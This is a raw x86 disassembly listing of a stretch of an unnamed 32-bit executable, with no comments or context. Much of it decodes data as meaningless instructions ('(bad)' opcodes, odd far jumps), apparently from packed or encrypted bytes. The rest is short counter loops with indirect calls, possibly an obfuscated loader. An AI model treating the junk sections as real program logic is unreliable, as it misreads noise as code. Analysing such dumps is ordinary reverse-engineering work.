  409d33:	loope  0x409d65
  409d35:	fist   DWORD PTR [edi-0x7531fe76]
  409d3b:	ret    
  409d3c:	scas   al,BYTE PTR es:[edi]
  409d3d:	cmp    al,0xba
  409d3f:	xlat   BYTE PTR cs:[ebx]
  409d41:	pop    ecx
  409d42:	add    dh,bl
  409d44:	sbb    al,0xf8
  409d46:	daa    
  409d47:	loop   0x409cf2
  409d49:	mov    cl,ah
  409d4b:	aaa    
  409d4c:	sbb    DWORD PTR [eax-0x75],esp
  409d4f:	retf   0x6adc
  409d52:	xchg   ebp,eax
  409d53:	arpl   WORD PTR [edx-0x66540219],cx
  409d59:	push   edx
  409d5a:	inc    esp
  409d5b:	jno    0x409d44
  409d5d:	mov    ds:0xe591e2ec,eax
  409d62:	adc    al,0x71
  409d64:	and    BYTE PTR [ecx-0x60],ch
  409d67:	mov    edx,0x8e876206
  409d6c:	sub    ebx,DWORD PTR [edx]
  409d6e:	fimul  DWORD PTR [esi]
  409d70:	push   ebx
  409d71:	leave  
  409d72:	ins    DWORD PTR es:[edi],dx
  409d73:	and    al,0x91
  409d75:	in     eax,dx
  409d76:	ins    DWORD PTR es:[edi],dx
  409d77:	push   ebp
  409d78:	adc    eax,esi
  409d7a:	mov    gs,WORD PTR [ecx-0x59aa070f]
  409d80:	in     eax,0x85
  409d82:	leave  
  409d83:	mov    DWORD PTR ds:0x433717,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43370b
  409d9c:	sub    DWORD PTR ds:0x4337df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433753,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	sub    eax,0x38c159c9
  409dc3:	loop   0x409e43
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409e1f
  409dcb:	xor    esp,DWORD PTR [esi+edi*4]
  409dce:	stc    
  409dcf:	popf   
  409dd0:	jle    0x409d79
  409dd2:	or     DWORD PTR [esi+0x54],edi
  409dd5:	jmp    0xa788:0xa6fd09fb
  409ddc:	ret    0xa31a
  409ddf:	add    bh,BYTE PTR [edx]
  409de1:	sbb    al,0xbc
  409de3:	push   0x47
  409de5:	cmp    al,0x51
  409de7:	mov    cl,0xd4
  409de9:	dec    esi
  409dea:	push   0x46e6d039
  409def:	aaa    
  409df0:	sbb    al,0x70
  409df2:	sub    eax,0x93e93052
  409df7:	mov    ecx,0x3a045318
  409dfc:	add    DWORD PTR [eax],esi
  409dfe:	xchg   ebx,eax
  409dff:	sti    
  409e00:	fisubr WORD PTR [edi+0x1944d7bd]
  409e06:	sub    WORD PTR [ebx-0x765ca147],bx
  409e0d:	xchg   DWORD PTR [esi+0x6ba62ee9],eax
  409e13:	into   
  409e14:	adc    al,0xb8
  409e16:	xchg   edx,eax
  409e17:	fcmove st,st(3)
  409e19:	ja     0x409e94
  409e1b:	mov    ds,WORD PTR [ecx-0x73]
  409e1e:	vaddsubps xmm3,xmm4,XMMWORD PTR [edx+0x32]
  409e23:	in     al,0x96
  409e25:	icebp  
  409e26:	pop    ecx
  409e27:	fisubr DWORD PTR [ecx+ebx*8-0x12]
  409e2b:	ins    DWORD PTR es:[edi],dx
  409e2c:	or     cl,BYTE PTR [edx+edx*1]
  409e2f:	push   esp
  409e30:	sub    DWORD PTR [ebx+ebp*2-0x3f16bad0],0xf0602c5e
  409e3b:	sbb    BYTE PTR [edi],ah
  409e3d:	push   es
  409e3e:	iret   
  409e3f:	(bad)  
  409e40:	adc    DWORD PTR [edi-0x26],ebp
  409e43:	fdivr  DWORD PTR [ebx+edx*4+0x1]
  409e47:	mov    ah,0x69
  409e49:	int    0xd7
  409e4b:	pop    esp
  409e4c:	lods   al,BYTE PTR ds:[esi]
  409e4d:	test   BYTE PTR es:[ebx-0xe],al
  409e51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e52:	push   edi
  409e53:	xor    eax,ebx
  409e55:	call   0xe3fe98b8
  409e5a:	call   0x67054028
  409e5f:	and    BYTE PTR [esi+0x5b],ah
  409e62:	or     DWORD PTR [eax],edx
  409e64:	dec    ecx
  409e65:	mov    ebp,0x11ebee85
  409e6a:	sahf   
  409e6b:	retf   0xf383
  409e6e:	test   cl,ch
  409e70:	and    ecx,DWORD PTR [edx+0x24]
  409e73:	out    dx,al
  409e74:	out    0xf0,eax
  409e76:	retf   
  409e77:	pusha  
  409e78:	cld    
  409e79:	mov    DWORD PTR [edi-0x99520fa],ebp
  409e7f:	sbb    DWORD PTR [esi],edx
  409e81:	push   esi
  409e82:	loop   0x409e94
  409e84:	add    esp,DWORD PTR [ebp+0x30]
  409e87:	dec    ecx
  409e88:	out    0xa3,al
  409e8a:	add    cx,sp
  409e8d:	aas    
  409e8e:	and    al,0xcd
  409e90:	scas   al,BYTE PTR es:[edi]
  409e91:	adc    ch,BYTE PTR [eax]
  409e93:	cmp    eax,0x341f78dd
  409e98:	dec    ebp
  409e99:	jp     0x409e1d
  409e9b:	shl    esi,cl
  409e9d:	xchg   ebp,eax
  409e9e:	mov    ah,0x66
  409ea0:	fldenv [ebx+ebx*4-0x74]
  409ea4:	pop    edx
  409ea5:	add    al,0x68
  409ea7:	bound  esi,QWORD PTR [ebx+0x2f]
  409eaa:	repnz out dx,eax
  409eac:	and    ebp,ebp
  409eae:	js     0x409e54
  409eb0:	or     DWORD PTR ds:0x78ac5bb6,ecx
  409eb6:	icebp  
  409eb7:	in     eax,dx
  409eb8:	mov    BYTE PTR [eax+ebx*1-0x36],al
  409ebc:	dec    esp
  409ebd:	pop    edx
  409ebe:	icebp  
  409ebf:	mov    ss,WORD PTR [ebx]
  409ec1:	les    esi,FWORD PTR [eax+0x5506f195]
  409ec7:	xchg   BYTE PTR ds:0x5f31cf94,ah
  409ecd:	ins    DWORD PTR es:[edi],dx
  409ece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ecf:	xlat   BYTE PTR ds:[ebx]
  409ed0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ed1:	test   BYTE PTR [ebx],ah
  409ed3:	sub    al,0x90
  409ed5:	cdq    
  409ed6:	and    BYTE PTR [ecx],0x8d
  409ed9:	inc    edx
  409eda:	add    ebp,DWORD PTR [ebx+edi*2+0x6b]
  409ede:	mov    ebx,0xbec8db7f
  409ee3:	sub    ebx,esp
  409ee5:	adc    BYTE PTR [edx-0x3fc14362],ah
  409eeb:	pop    edi
  409eec:	or     DWORD PTR [ebx*2-0x3bc33d3a],ebx
  409ef3:	pop    eax
  409ef4:	push   es
  409ef5:	push   es
  409ef6:	adc    bl,ch
  409ef8:	aaa    
  409ef9:	shl    DWORD PTR [edi+0x6],cl
  409efc:	mov    esi,0x4135746a
  409f01:	dec    ebx
  409f02:	in     eax,0x3e
  409f04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f05:	lea    esi,[ecx-0x60]
  409f08:	data16 adc bh,BYTE PTR [edx]
  409f0b:	pop    esp
  409f0c:	add    ebx,edx
  409f0e:	push   ds
  409f0f:	mov    esp,ecx
  409f11:	(bad)  
  409f12:	cli    
  409f13:	mov    ebx,0x3faee6a1
  409f18:	sub    dl,dl
  409f1a:	cmp    eax,0x2b5fd779
  409f1f:	xchg   DWORD PTR [edx+0x52],edx
  409f22:	std    
  409f23:	jns    0x409f8a
  409f25:	dec    eax
  409f26:	mov    al,0x49
  409f28:	xor    eax,0xfb628ce1
  409f2d:	ret    
  409f2e:	add    esi,esi
  409f30:	mov    ah,0xc2
  409f32:	fwait
  409f33:	icebp  
  409f34:	inc    ebp
  409f35:	xchg   esp,eax
  409f36:	sbb    DWORD PTR [edi],edx
  409f38:	popa   
  409f39:	call   0x8fafa18f
  409f3e:	mov    edx,0xba37336a
  409f43:	mov    ah,0xf4
  409f45:	mov    edi,0x1b1c9b2c
  409f4a:	pop    ebp
  409f4b:	mov    esi,edi
  409f4d:	mov    eax,ebx
  409f4f:	jbe    0x409f2e
  409f51:	jmp    0x22f17326
  409f56:	cdq    
  409f57:	setle  BYTE PTR [edx-0x1fa24f96]
  409f5e:	loope  0x409f30
  409f60:	mov    bl,0x93
  409f62:	test   eax,0x588365e2
  409f67:	and    DWORD PTR [eax],esi
  409f69:	mov    ebp,edi
  409f6b:	bound  ebx,QWORD PTR [esi-0x2a]
  409f6e:	in     eax,0xf5
  409f70:	loop   0x409f2f
  409f72:	cmp    DWORD PTR [esi-0x5c],ebx
  409f75:	mov    esp,0x9ce3f97a
  409f7a:	shl    esi,cl
  409f7c:	xchg   edx,eax
  409f7d:	jnp    0x409f07
  409f7f:	imul   esi,ecx,0xe39f5443
  409f85:	stc    
  409f86:	add    dl,BYTE PTR [ebp-0x44613ff9]
  409f8c:	adc    eax,0x67e8d35
  409f91:	std    
  409f92:	inc    ecx
  409f93:	sub    DWORD PTR [ebx+0x34],eax
  409f96:	sbb    bh,bh
  409f98:	xor    eax,0xfecb46bd
  409f9d:	jne    0x409f96
  409f9f:	sub    ecx,DWORD PTR [edx+0x62]
  409fa2:	pmulhw mm6,QWORD PTR [ecx-0x58edc380]
  409fa9:	shl    DWORD PTR [edi-0x3209cab1],0x4b
  409fb0:	mov    ebp,DWORD PTR [eax+0x6d]
  409fb3:	cmp    bh,dh
  409fb5:	or     eax,0xa74e5840
  409fba:	xor    eax,0x365b9208
  409fbf:	add    BYTE PTR [edx-0x4e83f4b2],al
  409fc5:	push   ebp
  409fc6:	ret    0x1986
  409fc9:	and    al,0x72
  409fcb:	jp     0x40a015
  409fcd:	or     DWORD PTR [ebx],esp
  409fcf:	mov    esp,DWORD PTR [edi]
  409fd1:	xchg   esp,eax
  409fd2:	sbb    eax,0xfdab1432
  409fd7:	and    dh,ch
  409fd9:	cmp    ah,BYTE PTR [ecx+0x6f78516a]
  409fdf:	inc    ebp
  409fe0:	aam    0x44
  409fe2:	jmp    0x901f:0x9bb1538
  409fe9:	in     eax,0x2
  409feb:	mov    WORD PTR [esi+0x60],gs
  409fee:	xor    al,0xee
  409ff0:	mov    esi,0x59f9f942
  409ff5:	(bad)  
  409ff7:	push   edx
  409ff8:	fnsetpm(287 only) 
  409ffa:	mov    ds:0x75cd6985,eax
  409fff:	lods   eax,DWORD PTR ds:[esi]
  40a000:	fnstsw ax
  40a002:	jbe    0x40a02f
  40a004:	(bad)  
  40a005:	mov    edx,0x99e5a02c
  40a00a:	or     eax,0xb4496db7
  40a00f:	fimul  WORD PTR [edi]
  40a011:	scas   eax,DWORD PTR es:[edi]
  40a012:	sar    BYTE PTR [ecx+0x4573],1
  40a018:	mov    edi,DWORD PTR ds:0x4337d3
  40a01e:	sbb    DWORD PTR ds:0x43370f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433763,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433723
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43375b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43375b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43375b,ecx
  40a059:	cmp    DWORD PTR ds:0x43375b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43393e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43375b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43370b,0x11
  40a090:	cmp    DWORD PTR ds:0x43370b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43370b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43370b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43370b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43370b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43370b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43370b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433703,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43376f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433713
  40a0ff:	mov    DWORD PTR ds:0x43376f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433767,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	dec    ebx
  40a127:	xor    DWORD PTR [eax+0x7ee0825c],ecx
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a0e9
  40a133:	xchg   esp,eax
  40a134:	add    DWORD PTR [edi+0x62b6b52d],0xc5281927
  40a13e:	jne    0x40a1a1
  40a140:	pop    ss
  40a141:	push   0x66
  40a143:	das    
  40a144:	cld    
  40a145:	mov    ch,0xc2
  40a147:	es sti 
  40a149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a14a:	ins    BYTE PTR es:[edi],dx
  40a14b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a14c:	int    0x41
  40a14e:	clc    
  40a14f:	icebp  
  40a150:	fsubr  DWORD PTR [ecx-0x5c]
  40a153:	std    
  40a154:	and    eax,0x65ac9397
  40a159:	mov    edx,0x10c0d01b
  40a15e:	pop    esp
  40a15f:	pusha  
  40a160:	jmp    0x4ff0:0xe27df7e2
  40a167:	adc    eax,0xdda3c120
  40a16c:	sub    BYTE PTR [ecx],bh
  40a16e:	mov    eax,ds:0x42ae077a
  40a173:	xor    DWORD PTR [eax+ebx*4+0x370ecc45],0xffffffb2
  40a17b:	adc    ebx,esi
  40a17d:	mov    bl,0x75
  40a17f:	dec    edi
  40a180:	or     ah,BYTE PTR [ecx+0x7f]
  40a183:	int    0xd8
  40a185:	mov    al,0xd4
  40a187:	rcr    BYTE PTR [ecx-0x7f],cl
  40a18a:	xor    al,0xd5
  40a18c:	xchg   esp,eax
  40a18d:	stos   DWORD PTR es:[edi],eax
  40a18e:	js     0x40a14d
  40a190:	stos   BYTE PTR es:[edi],al
  40a191:	pop    ss
  40a192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a193:	pop    edi
  40a194:	inc    eax
  40a195:	push   ss
  40a196:	xchg   ebx,eax
  40a197:	xor    ch,BYTE PTR [ecx]
  40a199:	pop    esp
  40a19a:	or     al,0xd7
  40a19c:	add    al,0xeb
  40a19e:	pop    esp
  40a19f:	ins    DWORD PTR es:[edi],dx
  40a1a0:	mov    cl,BYTE PTR [ecx]
  40a1a2:	sbb    eax,0x3a6aa35b
  40a1a7:	push   esi
  40a1a8:	sub    DWORD PTR fs:[ebx],0x87cb9f64
  40a1af:	sbb    esi,esp
  40a1b1:	(bad)  
  40a1b2:	fisttp QWORD PTR [ebx-0x4e]
  40a1b5:	repnz sub edi,eax
  40a1b8:	push   eax
  40a1b9:	outs   dx,DWORD PTR ds:[esi]
  40a1ba:	int3   
  40a1bb:	or     eax,0x4fdd5cb1
  40a1c0:	rol    DWORD PTR [ebx],cl
  40a1c2:	bound  ecx,QWORD PTR [ebx-0xd742878]
  40a1c8:	std    
  40a1c9:	mov    al,ds:0x1969364e
  40a1ce:	popf   
  40a1cf:	daa    
  40a1d0:	cmp    DWORD PTR [esp+ebp*1+0x691176f2],ecx
  40a1d7:	dec    eax
  40a1d8:	push   eax
  40a1d9:	push   esp
  40a1db:	mov    dh,0x4f
  40a1dd:	push   ebp
  40a1de:	jnp    0x40a1f8
  40a1e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1e1:	shr    BYTE PTR [edi+0x54],0x90
  40a1e5:	pop    DWORD PTR [edi+0x6169269e]
  40a1eb:	loopne 0x40a1d0
  40a1ed:	je     0x40a1ea
  40a1ef:	lds    esi,FWORD PTR [esi]
  40a1f1:	mov    eax,ds:0x1e86ff76
  40a1f6:	jle    0x40a1fc
  40a1f8:	jne    0x40a1e6
  40a1fa:	dec    edx
  40a1fb:	out    dx,al
  40a1fc:	inc    ecx
  40a1fd:	adc    BYTE PTR [edx],ah
  40a1ff:	std    
  40a200:	cs xchg ebx,eax
  40a202:	dec    eax
  40a203:	adc    eax,0x1dca3ded
  40a208:	arpl   WORD PTR [ecx+esi*4],ax
  40a20b:	retf   0xe87c
  40a20e:	sub    BYTE PTR [esi+0x39d5229e],0x6b
  40a215:	int3   
  40a216:	push   esi
  40a217:	jns    0x40a289
  40a219:	lds    ecx,FWORD PTR [ebx]
  40a21b:	aad    0x6e
  40a21d:	jmp    0x44b0:0xc65bcf18
  40a224:	mov    ch,0xf8
  40a226:	pushf  
  40a227:	add    DWORD PTR [edi+0x36],edi
  40a22a:	iret   
  40a22b:	pop    ecx
  40a22c:	ins    DWORD PTR es:[edi],dx
  40a22d:	nop
  40a22e:	add    DWORD PTR [edx-0x61],0xffffffe7
  40a232:	sbb    eax,0x8cc50f3a
  40a237:	das    
  40a238:	mov    WORD PTR [edi-0x414f6f88],cs
  40a23e:	xchg   esi,eax
  40a23f:	adc    edx,DWORD PTR [edx]
  40a241:	repnz lods al,BYTE PTR ds:[esi]
  40a243:	cmp    BYTE PTR [ebx+ebp*4-0x69],ah
  40a247:	outs   dx,DWORD PTR ds:[esi]
  40a248:	ficomp WORD PTR [eax]
  40a24a:	jmp    0x40a216
  40a24c:	(bad)  
  40a24d:	sub    DWORD PTR [esi],edx
  40a24f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a250:	and    al,0xec
  40a252:	fwait
  40a253:	fwait
  40a254:	(bad)  
  40a255:	xchg   ebx,eax
  40a256:	xchg   ecx,eax
  40a257:	jp     0x40a284
  40a259:	fdivr  st,st(0)
  40a25b:	dec    esp
  40a25c:	and    DWORD PTR [eax-0x1f],0xfffffff3
  40a260:	add    al,BYTE PTR [ebx+eax*4-0x2054c336]
  40a267:	push   ds
  40a268:	ffree  st(7)
  40a26a:	jne    0x40a28c
  40a26c:	and    dl,0x38
  40a26f:	retf   0xd479
  40a272:	adc    DWORD PTR [edi+0x141f9062],ecx
  40a278:	pop    esp
  40a279:	dec    ebx
  40a27a:	xchg   ebp,eax
  40a27b:	enter  0x88b6,0x7a
  40a27f:	jno    0x40a269
  40a281:	and    BYTE PTR [edi],dl
  40a283:	and    BYTE PTR gs:[eax],al
  40a286:	push   ebp
  40a287:	mov    BYTE PTR [ebx-0x2f],dl
  40a28a:	stos   BYTE PTR es:[edi],al
  40a28b:	sbb    ch,BYTE PTR ss:[eax]
  40a28e:	push   esi
  40a28f:	sub    esi,DWORD PTR [esi]
  40a291:	mov    ebp,0x57bb5394
  40a296:	cs (bad) 
  40a298:	std    
  40a299:	nop
  40a29a:	xchg   ebx,eax
  40a29b:	pop    es
  40a29c:	imul   edi,DWORD PTR [edi-0x19290993],0x74
  40a2a3:	pop    ebx
  40a2a4:	lea    esp,[ebx+0x63b35177]
  40a2aa:	push   esi
  40a2ab:	and    DWORD PTR [esi],ebx
  40a2ad:	sahf   
  40a2ae:	and    bh,BYTE PTR [edx+0x19]
  40a2b1:	gs out dx,eax
  40a2b3:	out    0xba,al
  40a2b5:	out    dx,al
  40a2b6:	jge    0x40a328
  40a2b8:	inc    ebp
  40a2b9:	mov    esi,0xf48c36ff
  40a2be:	hlt    
  40a2bf:	out    0x61,eax
  40a2c1:	push   0x70
  40a2c3:	dec    ebx
  40a2c4:	sbb    DWORD PTR [edi-0x697000bc],0xece50458
  40a2ce:	inc    eax
  40a2cf:	mov    dh,0x20
  40a2d1:	out    0x69,eax
  40a2d3:	mov    ds:0x3ab3b922,eax
  40a2d8:	mov    ss,ecx
  40a2da:	add    al,0xba
  40a2dc:	sub    al,0xcb
  40a2de:	dec    ebx
  40a2df:	xor    ecx,DWORD PTR [edx+0x16]
  40a2e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2e3:	fwait
  40a2e4:	mov    ah,0x49
  40a2e6:	xchg   esp,eax
  40a2e7:	retf   0x6ecf
  40a2ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2eb:	dec    esi
  40a2ec:	xor    ch,bh
  40a2ee:	es mov cl,0xcd
  40a2f1:	jecxz  0x40a280
  40a2f3:	cmc    
  40a2f4:	sub    bl,BYTE PTR [ecx+0x33]
  40a2f7:	pop    edi
  40a2f8:	sbb    edx,DWORD PTR [eax]
  40a2fa:	sub    DWORD PTR [esi+esi*2-0x6d],edx
  40a2fe:	sub    dh,BYTE PTR [edi+esi*1+0x97dbd75]
  40a305:	add    DWORD PTR [edx-0x3ef31437],0xffffffa9
  40a30c:	repz fisubr DWORD PTR [edx+ebp*2+0x7e]
  40a311:	mov    al,ds:0x2fa59bb0
  40a316:	loope  0x40a2e2
  40a318:	and    eax,0x5068c222
  40a31d:	mov    dh,BYTE PTR [edx+0x11]
  40a320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a321:	and    ebx,edi
  40a323:	adc    edi,esp
  40a325:	outs   dx,DWORD PTR ds:[esi]
  40a326:	cmc    
  40a327:	ret    
  40a328:	pop    ebx
  40a329:	or     bl,0x9e
  40a32c:	ss std 
  40a32e:	popa   
  40a32f:	pop    edx
  40a330:	mov    ds:0xfc8a4b37,eax
  40a335:	aam    0x15
  40a337:	arpl   WORD PTR [ebx-0xe],dx
  40a33a:	mov    cl,0x68
  40a33c:	mov    dl,0xf0
  40a33e:	or     esp,ecx
  40a340:	inc    ebx
  40a341:	fs int3 
  40a343:	or     eax,DWORD PTR [esi-0x16969299]
  40a349:	data16 cmp al,0x30
  40a34c:	push   ds
  40a34d:	add    dl,BYTE PTR [ebx+0x194f63c4]
  40a353:	mov    ds:0x19652cbc,eax
  40a358:	pop    eax
  40a359:	push   ecx
  40a35a:	out    dx,eax
  40a35b:	(bad)  
  40a35c:	iret   
  40a35d:	xchg   ebp,eax
  40a35e:	imul   edx,DWORD PTR [edx-0x268d2b50],0x3e
  40a365:	pop    ecx
  40a366:	mov    esp,0x70d3796
  40a36b:	lahf   
  40a36c:	and    ebx,ebx
  40a36e:	fdivr  DWORD PTR [edi+0x7c6bac64]
  40a374:	push   edi
  40a375:	(bad)  
  40a376:	mov    edi,0xe84d8b0e
  40a37b:	xor    ecx,eax
  40a37d:	and    DWORD PTR ds:0x4336fb,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4336fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4336fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4336fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4336fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4337ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43376b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433767,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433767,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433767,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433797
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433767,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433767
  40a434:	dec    eax
  40a435:	mov    ds:0x433767,eax
  40a43a:	mov    eax,ds:0x433767
  40a43f:	dec    eax
  40a440:	mov    ds:0x433767,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43371f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43382f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433823,0x4337a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433707,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	mov    esi,0x4c0fec07
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	pop    edi
  40a4a8:	push   ebx
  40a4a9:	scas   al,BYTE PTR es:[edi]
  40a4aa:	pop    eax
  40a4ab:	pop    ds
  40a4ac:	mov    ch,0xb
  40a4ae:	(bad)  
  40a4af:	test   BYTE PTR [edx-0x15d5a06e],0x2c
  40a4b6:	ds repz jle 0x40a4b5
  40a4ba:	xchg   ebp,eax
  40a4bb:	int    0x67
  40a4bd:	lock pop edi
  40a4bf:	sbb    eax,0x39d24e09
  40a4c4:	cmp    bh,BYTE PTR [ebx]
  40a4c6:	aam    0xac
  40a4c8:	xchg   ebp,eax
  40a4c9:	aas    
  40a4ca:	shl    eax,cl
  40a4cc:	stos   DWORD PTR es:[edi],eax
  40a4cd:	std    
  40a4ce:	cmp    ecx,esi
  40a4d0:	nop
  40a4d1:	das    
  40a4d2:	mov    WORD PTR [ecx-0x1e3d791c],?
  40a4d8:	scas   al,BYTE PTR es:[edi]
  40a4d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4db:	rcl    BYTE PTR es:[edi-0x44],1
  40a4df:	xchg   BYTE PTR [edx+0x84ade6b],bh
  40a4e5:	test   al,0x3a
  40a4e7:	sar    BYTE PTR [edx+0x7114a21d],1
  40a4ed:	fld    st(3)
  40a4ef:	mov    ah,0x12
  40a4f1:	and    bh,BYTE PTR [ecx-0x45]
  40a4f4:	jno    0x40a4ec
  40a4f6:	sti    
  40a4f7:	xor    al,0x28
  40a4f9:	mov    ebx,0x92d54d15
  40a4fe:	xchg   ebp,eax
  40a4ff:	mov    DWORD PTR [esi+ebp*4+0x3],0x62cf156d
  40a507:	fidiv  WORD PTR [esi-0x54]
  40a50a:	aad    0xb0
  40a50c:	leave  
  40a50d:	cmc    
  40a50e:	loopne 0x40a561
  40a510:	pop    ecx
  40a511:	jmp    0x1b:0x9e1f88db
  40a518:	fstp   DWORD PTR [ecx-0x25]
  40a51b:	jmp    0xbf24:0x786c8e46
  40a522:	into   
  40a523:	pop    ebp
  40a524:	pop    edx
  40a525:	add    dl,dl
  40a527:	and    eax,0x983d24be
  40a52c:	iret   
  40a52d:	pop    esp
  40a52e:	and    dl,dl
  40a530:	pusha  
  40a531:	or     dh,bh
  40a533:	lea    ebp,[edi]
  40a535:	cmp    al,0x97
  40a537:	xor    BYTE PTR [eax+0x4bda96ac],al
  40a53d:	and    edi,0x61
  40a540:	dec    eax
  40a541:	xor    DWORD PTR [ecx],eax
  40a543:	jge    0x40a51d
  40a545:	(bad)  [edx]
  40a547:	fucom  st(2)
  40a549:	mov    dh,0x23
  40a54b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a54c:	jle    0xa6bfe608
  40a552:	adc    eax,0xacd40eb3
  40a557:	fisttp DWORD PTR [ebx+0x200b7b15]
  40a55d:	cmp    eax,0x196c0ff1
  40a562:	xor    ebx,0xe9faf8ec
  40a568:	(bad)  
  40a569:	lods   eax,DWORD PTR ds:[esi]
  40a56a:	int3   
  40a56b:	cs jp  0x40a5b9
  40a56e:	rcl    DWORD PTR ds:0xb62c79f0,1
  40a574:	jnp    0x40a570
  40a576:	rcl    dh,0xdb
  40a579:	mov    WORD PTR [edx],ds
  40a57b:	and    edx,DWORD PTR ds:0x70c2f4c
  40a581:	cdq    
  40a582:	mov    bh,BYTE PTR [ebx+ecx*4+0x30020c0f]
  40a589:	xchg   DWORD PTR [ebp+0x240155b1],esi
  40a58f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a590:	dec    edx
  40a591:	or     ecx,DWORD PTR [edi]
  40a593:	aam    0x3d
